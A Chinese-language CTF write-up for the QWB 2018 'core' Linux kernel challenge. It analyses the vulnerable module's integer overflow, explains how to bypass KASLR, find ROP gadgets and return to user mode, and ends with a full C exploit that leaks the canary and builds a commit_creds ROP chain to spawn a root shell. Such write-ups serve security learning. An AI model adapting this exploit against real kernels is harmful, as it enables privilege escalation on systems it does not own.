---
title: QWB_core
date: 2023-03-14 10:33:40
tags:
- pwn
- kernel 
- ROP
- ret2usr
categories:
- pwn_wp

---

强网杯2018 core，从0到1的kernel。

<!--more-->

### 分析

首先分析启动脚本`start.sh`

```sh
qemu-system-x86_64 \	# x86_64架构
-m 64M \	# 分配64M内存
-kernel ./bzImage \		# 使用bzImage作为内存镜像(kernel)	
-initrd  ./core.cpio \	# 使用core.cpio作为磁盘镜像(文件系统)
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \ # 设置root，指定终端为tty50，开启kaslr
-s  \	# 启动后qemu不立即运行guest，而是等待主机gdb发起连接，使用1234端口
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \     # 网络配置
-nographic  \		# 非图形化启动，使用命令行
```

解压``core.cpio`，查看`init`文件（初始化的过程）：

```sh
#!/bin/sh
# 挂载文件系统
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
# 复制了一份符号表
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
# 网络配置
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
# 加载了core.ko模块
insmod /core.ko

#定时关机
poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

checksec一下`core.ko`:

```sh
[*] '/home/a1ph0nse/PwnPractice/OwnTrain/StrongWeb2018core/core_give/give_to_player/core/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
```

扔到IDA逆一下，`init_module`是这个模块的初始化工作：

```c
__int64 init_module()
{
  core_proc = proc_create("core", 0666LL, 0LL, &core_fops);
  printk(&unk_2DE);
  return 0LL;
}
```

这个模块一开始就会创建一个自己的进程，使用的是`core_fops`。

```c
static inline struct proc_dir_entry *proc_create(const char *name, mode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);
```

- name就是要创建的文件名。
- **mode是文件的访问权限，以UGO的模式表示。**
    - UGO：使用三组字符串(或数字)表示属用户，属组和其他用户的rwx权限：r=4,w=2,x=1(因此777就是rwxrwxrwx)
- **parent与proc_mkdir中的parent类似。也是父文件夹的proc_dir_entry对象**。
- proc_fops就是该文件的操作函数了。

```asm
.data:0000000000000420 40 05 00 00 00 00 00 00       core_fops dq offset __this_module       ; DATA XREF: init_module↑o
.data:0000000000000428 00 00 00 00 00 00 00 00       dq 0
.data:0000000000000430 00 00 00 00 00 00 00 00       dq 0
.data:0000000000000438 11 00 00 00 00 00 00 00       dq offset core_write
.data:0000000000000440 00 00 00 00 00 00 00 00       dq 0
.data:0000000000000448 00 00 00 00 00 00 00 00       dq 0
.data:0000000000000450 00 00 00 00 00 00 00 00       dq 0
.data:0000000000000458 00 00 00 00 00 00 00 00       dq 0
.data:0000000000000460 00 00 00 00 00 00 00 00       dq 0
.data:0000000000000468 5F 01 00 00 00 00 00 00       dq offset core_ioctl
```

`core_fops`中有`core_write`、`core_ioctl`和`core_release`三个函数。

`core_release`仅输出一段字符串，没有利用价值。

`core_write`会将一段用户空间的数据(最多0x800byte)，写入`bss`的`name`处。

`core_ioctl`会根据请求码选择不同的操作，可以调用`core_read`将栈上偏移`off`的数据写入用户空间，可以设置`off`，也可以调用`core_copy_func`。

在`core_copy_func`会将`bss`中的`name`复制到栈上，其中有一个**整数溢出**，可以通过**负数**绕过检查并实现栈溢出。

补充一下相关的内容：`core_fops`是一个`file_operations`的结构体，通过覆盖其中的内容来修改用户层调用时，该内核模块中执行的函数。

```c
struct file_operations {
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);
	ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);
	int (*iopoll)(struct kiocb *kiocb, struct io_comp_batch *,
			unsigned int flags);
	int (*iterate) (struct file *, struct dir_context *);
	int (*iterate_shared) (struct file *, struct dir_context *);
	__poll_t (*poll) (struct file *, struct poll_table_struct *);
	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
	long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
	int (*mmap) (struct file *, struct vm_area_struct *);
	unsigned long mmap_supported_flags;
	int (*open) (struct inode *, struct file *);
	int (*flush) (struct file *, fl_owner_t id);
	int (*release) (struct inode *, struct file *);
	int (*fsync) (struct file *, loff_t, loff_t, int datasync);
	int (*fasync) (int, struct file *, int);
	int (*lock) (struct file *, int, struct file_lock *);
	ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
	unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
	int (*check_flags)(int);
	int (*flock) (struct file *, int, struct file_lock *);
	ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
	ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
	int (*setlease)(struct file *, long, struct file_lock **, void **);
	long (*fallocate)(struct file *file, int mode, loff_t offset,
			  loff_t len);
	void (*show_fdinfo)(struct seq_file *m, struct file *f);
#ifndef CONFIG_MMU
	unsigned (*mmap_capabilities)(struct file *);
#endif
	ssize_t (*copy_file_range)(struct file *, loff_t, struct file *,
			loff_t, size_t, unsigned int);
	loff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,
				   struct file *file_out, loff_t pos_out,
				   loff_t len, unsigned int remap_flags);
	int (*fadvise)(struct file *, loff_t, loff_t, int);
} __randomize_layout;
```

在`core_fops`中修改了内核中`write`的指向，在用户层调用`write`函数最终就会调用到这个内核模块中定义的`core_write`。

经过上面的分析，我们可以有一个大概的思路：

`查找关键函数地址计算偏移 --> 利用core_read泄露Canary--> 在name中构建ROP chain --> 利用core_copy_func的栈溢出执行ROP链 --> 获取root权限并返回用户态获取root shell`

### 坑

#### 对抗KASLR

在`start.sh`中就可以看到，这道题开启了`KASLR`保护，这和`ASLR`是类似的，都是一种地址随机化技术，我们可以在获取地址后**计算偏移**来绕过。但对于没有相关经验的我来说，怎么计算偏移是一个问题，查阅资料后发现，这需要利用到vmlinux文件。

在linux系统中，vmlinux（vmlinuz）是一个包含linux kernel的**静态链接的可执行文件**，文件类型可能是linux接受的可执行文件格式之一（ELF、COFF或a.out），vmlinux若要用于调试时则必须要在引导前增加symbol table

**应用场景：**

- 用于调试，但需要包含调试信息
- 编译出来的内核原始文件，可以被用来制作后面zImage，bzImage等启动Image
- UBoot不能直接使用vmlinux

**相关内容：**

- vmlinux是ELF文件。是编译出来的最原始的文件
- vmlinuz是被压缩的linux内核，是可以被引导的
- vmlinuz是一个统称。有两种详细的表现形式：zImage和bzImage(big zImage)。
- zImage是vmlinuz经过gzip压缩后的文件，适用于小内核
- bzImage是vmlinuz经过gzip压缩后的文件，适用于大内核

简单的说，**vmlinux就是一个被压缩的`kernel`，是一个静态的ELF文件**。我们可以在vmlinux的`.text`段中查看到这个kernel的**所有函数地址(其基地址为vmlinux的基地址)**，而这些地址都是**静态的**。

> **无论是找gadget还是找函数地址一定要在对应的vmlinux中找，本地的在kernel用的`.cpio`中的vmlinux中，远程的在给的vmlinux（可以看作libc）**

因此，我们可以通过readelf查找`.text`段的基地址。

```sh
readelf -t vmlinux
```

可以通过pwntools的ELF模块找到其中的地址，从而算出**函数到基地址的偏移**。

```py
from pwn import*
elf=ELF('./vmlinux')
vmbase=0xffffffff81000000
commit_offset=elf.symbols['commit_creds']-vmbase
prepare_offset=elf.symbols['prepare_kernel_cred']-vmbase

print("commit_offset: "+hex(commit_offset))
print("prepare_offset: "+hex(prepare_offset))
```

但这还没有结束，我们需要获取运行中kernel的真实地址，才能计算出内核的基地址。

在init中有下面的一段，将符号表复制到了`/tmp/kallsyms`中，通过读取符号表的内容，我们可以获取到`commit_creds`和`prepare_kernel_cred`的真实地址。

```sh
# 复制了一份符号表
cat /proc/kallsyms > /tmp/kallsyms
```

符号表分为`地址、类型、函数名`三列，读取每一项后比对函数名就可以找到真实地址，这里用了`fscanf`函数。

```c
int fscanf(FILE *stream, const char *format, ...)
//返回值为读取的个数
//读取地址
fscanf(symbols_table, "%llx%s%s", &addr, type, func_name);
```

读到真实地址后，用`真实地址-偏移`即可得到运行中kernel的基地址，借此我们可以计算出**两个基地址之间的偏移**。

#### 获取gadget

获取gadget同样需要利用vmlinux，可以直接使用`ROPgadget`来搜，不过这样分析一次vmlinux的时间挺长的，可以先把所有gadget搜出来，然后再用grep找。

```sh
ROPgadget --binary vmlinux > gadget
cat gadget | grep '...'
```

对于找不到的gadget，可以用pwntools

```py
from pwn import*
elf=ELF("./vmlinux")
context.arch='amd64' # 记得设置arch，不然找不到
print(hex(elf.search(asm('iretq')).__next__()))
```

执行`commit_creds(prepare_kernel_cred(0))`的时候，因为返回值存在`rax`，因此我们需要`mov rdi, rax ;`之后再`commit_creds()`。

这里找不到`mov rdi, rax ; ret`的gadget，因此用`mov rdi, rax; call rdx`来替代，所以要提前设置好`rdx`。除此之外，`call rdx`会将`rdx`**指向指令的下一条指令（地址上）入栈**，这会让rop链断开，因此`rdx`指向的指令需要把这个入栈的指令除掉，并通过`ret`接上rop链，这里用的是`pop rcx; ret`。

#### 返回用户态

为了让内核函数执行完成后能够顺利返回用户态，需要在用户态保存一些寄存器的值，这个函数应该首先被执行：

```c
size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}
```

而在返回用户态时，只需要在栈中构造好保存的用户状态，执行`swapg; iretq`就能返回用户态。

```c
//最后的栈布局，用于返回用户态
↓   swapgs
    iretq
    user_shell_addr // get shell函数的地址
    user_cs
    user_eflags //64bit user_rflags
    user_sp
    user_ss
```

#### qemu

- 做题时最好首先file一下确认文件类型，如果不是cpio文件则在本地调试时应按照原先的打包方式打包回去，否则可能会出现无法启动等问题。有的题目会给出打包文件系统的shell文件，需要重点关注。

- 如果题目给的内核跑不动，可以尝试将boot.sh中申请的内存改大些（即qemu的-m选项后面，如果64M跑不动就改成128M试试）。

- 在入门测试时，经常会遇到内核启动不了，一直在重启的情况，将控制台强行叉掉后再开启可能会显示：`qemu-system-x86_64: -s: Failed to find an available port: Address already in use`。这是因为强制关闭后，qemu占用的端口还未被清除。解决方法：使用`lsof -i tcp:<port>`命令查看指定端口的占用情况，在start.sh中看到了qemu后的-s选项说明默认端口为1234。此时即输入`lsof -i tcp:1234`，找到占用的pid将其kill即可：`kill <pid>`

#### gdb调试

和用户态调试不同，kernel的调试需要我们attach到qemu开放的端口

```sh
sudo gdb
file vmlinux # 载入符号信息
target remote localhost:1234 # -s 默认为1234端口

```

在本地调试的时候可以先用root调试，获取进程的基地址方便下断点

```sh
# qemu里获取基地址，通常基址的偏移相同，需要在gdb attach之前进行
cat /sys/module/xxx/sections/.text
cat /sys/module/xxx/sections/.data
cat /sys/module/xxx/sections/.bss

# 在gdb中设置基地址
add-symbol-file ./xxx.ko text_base -s .data data_base -s .bss bss_base 
```

修改为root

```sh
setsid /bin/cttyhack setuidgid 1000 /bin/sh
=> setsid /bin/cttyhack setuidgid 0 /bin/sh
```

### exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

void saveStatus();
void get_address();
void coreRead(char* buf);
void coreCopyFunc(size_t length);
void edit_off(size_t num);
void shell();
void print_binary(char* buf, int length);

// gadget 

const size_t pop_rdi_ret=0xffffffff81000b2f; 
const size_t pop_rdx_ret=0xffffffff810a0f49; 
const size_t pop_rcx_ret=0xffffffff81021e53; 
const size_t swapgs_popfq_ret=0xffffffff81a012da; 
const size_t iretq_ret=0xffffffff81050ac2; 
const size_t mov_rdi_rax_call_rdx=0xffffffff8101aa6a; 

int fd=0;
size_t commit_creds=0, prepare_kernel_cred=0;
size_t raw_vmlinux_base=0xffffffff81000000;
size_t vmlinux_base=0;
size_t vmoffset=0;

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

// get address from /tmp/kallsym
void get_address()
{
    FILE* symbols_table=fopen("/tmp/kallsyms","r");
    if(symbols_table==NULL)
    {
		printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
		exit(1);
    }
     
    size_t addr = 0;
	char type[0x10];
	char func_name[0x50];
	// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
	while(fscanf(symbols_table, "%llx%s%s", &addr, type, func_name))
    {
		if(commit_creds && prepare_kernel_cred)		// two addresses of key functions are all found, return directly.
			return;
        // function "commit_creds" found
		if(!strcmp(func_name, "commit_creds"))
        {		
			commit_creds = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
		}
        // function "prepare_kernel_cred" found
        if(!strcmp(func_name, "prepare_kernel_cred"))
        {	
			prepare_kernel_cred = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
		}
	}
}

void coreRead(char* buf)
{
    ioctl(fd,0x6677889B,buf);
}

void coreCopyFunc(size_t length)
{
    ioctl(fd,0x6677889A,length);
}

void edit_off(size_t num)
{
    ioctl(fd,0x6677889C,num);
}

void shell()
{
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
	int index = 0;
	char output_buffer[80];
	memset(output_buffer, '\0', 80);
	memset(output_buffer, ' ', 0x10);
	for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
		char temp_buffer[0x10];
		memset(temp_buffer, '\0', 0x10);
		sprintf(temp_buffer, "%#5x", index);
		strcpy(output_buffer, temp_buffer);
		output_buffer[5] = ' ';
		output_buffer[6] = '|';
		output_buffer[7] = ' ';
		for(int j=0; j<16; j++){
			if(index+j >= length)
				sprintf(output_buffer+8+3*j, "   ");
			else{
				sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
				if(!isprint(buf[index+j]))
					output_buffer[58+j] = '.';
				else
					output_buffer[58+j] = buf[index+j];
			}
		}
		output_buffer[55] = ' ';
		output_buffer[56] = '|';
		output_buffer[57] = ' ';
		printf("%s\n", output_buffer);
		memset(output_buffer+58, '\0', 16);
		index += 16;
	}
}


int main()
{
    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");
    saveStatus();

    // open core
    fd=open("/proc/core",2);
    if(fd==0)
    {
        printf("\033[31m\033[1m[x] Error: Cannot open process \"core\"\n\033[0m");
		exit(1);
    }

    
    // get commit_creds and prepare_kernel_cred 
    get_address();
    
    char buf[0x50]={0};
    // cal real vm base
    vmlinux_base=commit_creds-0x9c8e0;
    vmoffset=vmlinux_base-raw_vmlinux_base;
    printf("\033[34m\033[1m[*] This is real vmlinux base :\033[0m%llx\n",vmlinux_base);

    // leak canary
    edit_off(64);
    coreRead(buf);
    
    size_t canary=((size_t*)buf)[0];
    printf("\033[35m\033[1m[*] The value of canary is the first 8 bytes: \033[0m%#llx\n", canary);

    // make rop chain
    size_t rop_chain[0x100];
    int i=0;
    // padding and canary
    for(; i<10; i++)
		rop_chain[i] = canary;
    
    // commit_creds(prepare_kernel_cred(0)); 
    // rdi=0
    rop_chain[i++]=pop_rdi_ret+vmoffset;
    rop_chain[i++]=0;
    // prepare_kernel_cred(0);
    rop_chain[i++]=prepare_kernel_cred;
    // rdi=rax; call rdx --> pop rcx(move the next code of mov) --> commit_creds(prepare_kernel_cred(0));
    rop_chain[i++]=pop_rdx_ret+vmoffset;
    rop_chain[i++]=pop_rcx_ret+vmoffset;
    rop_chain[i++]=mov_rdi_rax_call_rdx+vmoffset;
    rop_chain[i++]=commit_creds;
    // ret2usr swags; iretq
    rop_chain[i++]=swapgs_popfq_ret+vmoffset;
    rop_chain[i++]=0;   // popfq
    rop_chain[i++]=iretq_ret+vmoffset;
    // after the iretq: return address, user cs, user rflags, user sp, user ss
    rop_chain[i++]=(size_t)shell;
    rop_chain[i++]=user_cs;
    rop_chain[i++]=user_rflags;
    rop_chain[i++]=user_sp;
    rop_chain[i++]=user_ss;

	printf("\033[34m\033[1m[*] Our rop chain looks like: \033[0m\n");
	print_binary((char*)rop_chain, 0x100);

	write(fd, (char*)rop_chain, 0x800);
    // use negative number overflow
	coreCopyFunc(0xffffffffffff0100);
    return 0;

}
```





